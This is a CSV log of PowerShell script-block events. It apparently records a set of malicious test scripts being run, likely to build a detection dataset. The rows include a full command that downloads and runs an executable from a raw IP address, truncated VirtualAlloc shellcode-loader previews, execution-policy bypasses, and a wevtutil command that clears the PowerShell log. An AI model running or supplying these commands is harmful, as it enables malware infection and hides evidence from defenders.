"TimeCreated","ScriptPath","ScriptLength","ScriptPreview"
"8/4/2026 10:45:14 PM","C:\TA\project-ta\data_spliting\test_set\malicious\112.ps1","159","(New-Object System.Net.WebClient).DownloadFile('http://93.174.94.137/~karma/scvhost.exe',""$env:APPDATA\scvhost.exe"");Start-Process (""$env:APPDATA\scvhost.exe"")"
"8/4/2026 10:45:13 PM","","151","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\malicious\112.ps1'"
"8/4/2026 10:45:02 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:45:02 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:45:02 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:45:01 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:45:01 PM","C:\TA\project-ta\data_spliting\test_set\malicious\102.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/4/2026 10:45:01 PM","","151","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\malicious\102.ps1'"
"8/4/2026 10:44:52 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:44:52 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:44:52 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:44:52 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:44:51 PM","C:\TA\project-ta\data_spliting\test_set\malicious\82.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/4/2026 10:44:51 PM","","150","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\malicious\82.ps1'"
"8/4/2026 10:44:41 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:44:41 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:44:41 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:44:41 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:44:40 PM","C:\TA\project-ta\data_spliting\test_set\malicious\67.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/4/2026 10:44:40 PM","","150","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\malicious\67.ps1'"
"8/4/2026 10:44:26 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:44:25 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:44:25 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:44:25 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:44:25 PM","C:\TA\project-ta\data_spliting\test_set\malicious\66.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/4/2026 10:44:25 PM","","150","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\malicious\66.ps1'"
"8/4/2026 10:44:14 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:44:14 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:44:14 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:44:14 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:44:14 PM","C:\TA\project-ta\data_spliting\test_set\malicious\61.ps1","2446","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/4/2026 10:44:14 PM","","150","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\malicious\61.ps1'"
"8/4/2026 10:43:58 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:43:58 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:43:58 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:43:58 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:43:58 PM","C:\TA\project-ta\data_spliting\test_set\malicious\52.ps1","2711","$6UhT = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/4/2026 10:43:58 PM","","150","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\malicious\52.ps1'"
"8/4/2026 10:43:33 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:43:33 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:43:33 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:43:33 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:43:32 PM","C:\TA\project-ta\data_spliting\test_set\malicious\14.ps1","2244","$qkc = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/4/2026 10:43:32 PM","","150","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\malicious\14.ps1'"
"8/4/2026 10:43:28 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:43:28 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:43:28 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:43:28 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:43:27 PM","C:\TA\project-ta\data_spliting\test_set\malicious\13.ps1","2245","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/4/2026 10:43:27 PM","","150","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\malicious\13.ps1'"
"8/4/2026 10:43:23 PM","","9","$global:?"
"8/4/2026 10:43:23 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:43:23 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:43:23 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:43:23 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:43:23 PM","","150","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\malicious\11.ps1'"
"8/4/2026 10:42:54 PM","","6","prompt"
"8/4/2026 10:42:54 PM","","55"," wevtutil cl ""Microsoft-Windows-PowerShell/Operational"""
